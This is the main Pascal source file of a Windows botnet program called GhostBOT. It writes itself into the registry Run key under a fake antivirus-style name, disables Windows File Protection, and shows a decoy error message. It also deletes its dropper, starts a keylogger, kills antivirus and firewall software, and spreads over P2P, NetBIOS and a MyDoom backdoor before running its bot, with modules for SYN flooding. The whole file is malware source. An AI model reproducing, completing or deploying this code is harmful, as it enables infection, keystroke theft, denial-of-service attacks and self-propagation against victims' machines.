   {$A+,B-,C-,D-,E-,F-,G+,H+,I+,J+,K-,L-,M-,N+,O+,P+,Q-,R-,S-,T-,U+,V+,W-,X+,Y-,Z1}

   PROGRAM pGhostBOT;

   uses
     Windows,
     uCRC32 in 'uCRC32.pas',
     uUtils in 'uUtils.pas',
     AclUtils in 'ACLUnits\ACLUTILS.PAS',
     Registry in 'ACLUnits\REGISTRY.PAS',
     uAPISearchEngine in 'uAPISearchEngine.PAS',
     uP2P in 'uP2P.PAS',
     uKillAV in 'uKILLAV.PAS',
     uKeySpy in 'uKEYSPY.PAS',
     uSockets in 'uSOCKETS.PAS',
     uWebserver in 'uWEBSERVER.PAS',
     uPrepender in 'uPREPENDER.PAS',
     uBOT in 'uBOT.pas',
     uSynFlood in 'uSynFlood.pas',
     uNetBIOS in 'uNetBIOS.PAS',
     uStrList in 'uStrList.pas',
     uThreads in 'uThreads.pas';

   {$I Settings.ini}

   {$IFDEF DEBUG}
     {$APPTYPE CONSOLE}
   {$ENDIF}

   {$IFDEF USE_ICON}
     {$R icon.res}
   {$ENDIF}

   VAR
     Msg                : TMsg;
     GhostRegKey        : STRING;
     {$IFDEF Use_Fake_Error_Message}
     ErrorMessageThread : THandle;
     {$ENDIF}
     WSAData            : TWSAData;

   //------------------------------------------------------------------------------
   PROCEDURE SetGhostRegKey;                                                        //Register a random file into registry
   VAR
     FileName : STRING;
   BEGIN
     Reg.RootKey:=HKEY_LOCAL_MACHINE;
     Reg.OpenKey(MainStr(47)+MainStr(35),True);                                    //"\software\microsoft\","Windows\CurrentVersion\Run"
     FileName:=WinPath+RandomFileName;
     Reg.WriteString(Decodestring(Random(ItemsCountInEncodedString(TAVNAME))+1,TAVNAME),FileName);
     Reg.CloseKey;
     CopyFiles(True,FileName);
   END;

   //------------------------------------------------------------------------------
   FUNCTION GetGhostRegKey : STRING;
   VAR
     I    : WORD;
     O    : WORD;
     X    : STRING;
     Keys : TStrList;
   BEGIN
     Keys:=TStrList.Create;
     Reg.RootKey:=HKEY_LOCAL_MACHINE;
     Reg.OpenKey(MainStr(47)+MainStr(35),False);                                   //"\software\microsoft\","windows\currentversion\run"
     Reg.GetValueNames(Keys);
     IF Keys.Count>0 THEN
       FOR I:=0 TO Keys.Count-1 DO
         FOR O:=1 TO ItemsCountInEncodedString(TAVNAME) DO BEGIN
           X:=DecodeString(O,TAVNAME);
           IF Pos(Keys.Strings(I),X)=1 THEN BEGIN
               RESULT:=Keys.Strings(I);
               Break;
           END;
         END;
     IF RESULT='' THEN RESULT:=DecodeString(Random(ItemsCountInEncodedString(TAVNAME))+1,TAVNAME);
     Keys.Free;
     Reg.CloseKey;
   END;

   //------------------------------------------------------------------------------
   FUNCTION FirstRun : BOOL;
   VAR
     S : STRING;
   BEGIN
     Result:=True;
     Reg.RootKey:=HKEY_LOCAL_MACHINE;
     S:=MainStr(47)+MainStr(35);                                                   //"\software\microsoft\","windows\currentversion\run"
     Reg.OpenKey(S,False);
     IF Reg.ValueExists(GhostRegKey) THEN BEGIN
      S:=Reg.ReadString(GhostRegKey);
      IF FileExists(S) THEN Result:=False;
     END;
     Reg.CloseKey;
   END;

   {$IFDEF Disable_File_Protection}
   //------------------------------------------------------------------------------
   PROCEDURE DisableFileProtection;
   BEGIN
     IF IsNTBasedOS THEN BEGIN
       Reg.RootKey:=HKEY_LOCAL_MACHINE;
       IF Reg.OpenKey(MainStr(49),False) THEN BEGIN                                //"\Software\Microsoft\Windows NT\CurrentVersion\Winlogon"
         Reg.WriteInteger(MainStr(182),$FFFFFF9D);                                 //"SFCDisable"
         Reg.CloseKey;
       END;
     END;
   END;
   {$ENDIF}

   {$IFDEF Use_Fake_Error_Message}
   //------------------------------------------------------------------------------
   PROCEDURE ErrorMessage;
   BEGIN
     Randomize;
     MessageBox(0,pChar(DecodeString(Random(ItemsCountInEncodedString(TERRORMESSAGES))+1,TERRORMESSAGES)),pChar(MainStr(166)),MB_ICONHAND); //"Error"
     ExitThread(ErrorMessageThread);
   END;
   {$ENDIF}

   //------------------------------------------------------------------------------
   BEGIN
     BuildCRC32Table;
     InitProcesses;
     Randomize;
     IF(ParamCount=1)AND(FileExists(ParamStr(1))) THEN BEGIN
       Sleep(5000);
       DeleteFile(ParamStr(1));
     END;
     IF WaitForSingleObject(CreateMutexA(NIL,False,pChar(MutexName)),0)<>Wait_TimeOut THEN BEGIN //"GhostBOT"
       SetWinPath;
       Randomize;
       Reg:=TRG.Create;
       GhostRegKey:=GetGhostRegKey;
       IF FirstRun THEN BEGIN
         {$IFDEF Use_Fake_Error_Message} ErrorMessageThread:=BeginThread(NIL,0,@ErrorMessage,NIL,0,ThreadID); {$ENDIF}
         {$IFNDEF Disable_StartUp_Infection} SetGhostRegKey; {$ENDIF}
       END;
       Randomize;
       WaitForInternet;
       WSAStartUp(257,WSAData);
       {$IFDEF Disable_File_Protection} DisableFileProtection; {$ENDIF}
       {$IFDEF Use_P2P_Spreader} InitPeerToPeer; {$ENDIF}
       {$IFDEF Use_Key_Spy}
       AssignFile(KeyFile,WinPath+MainStr(34));                                    //"setup.txt"
       BeginThread(NIL,0,@GetLetter,NIL,0,ThreadID);
       {$ENDIF}
       {$IFDEF Use_AVFW_Killer} StartAVFWKiller; {$ENDIF}
       {$IFDEF Use_NetBIOS_Spreader} StartNetBIOS; {$ENDIF}
       {$IFDEF Use_MyDoom_Spreader} StartMyDoom; {$ENDIF}

       GhostBOT:=TGhostBOT.Create;
       GhostBOT.Clone:=False;
       GhostBOT.StartBOT;

       WHILE GetMessage(Msg,0,0,0) DO DispatchMessage(Msg);
     END;
   END.
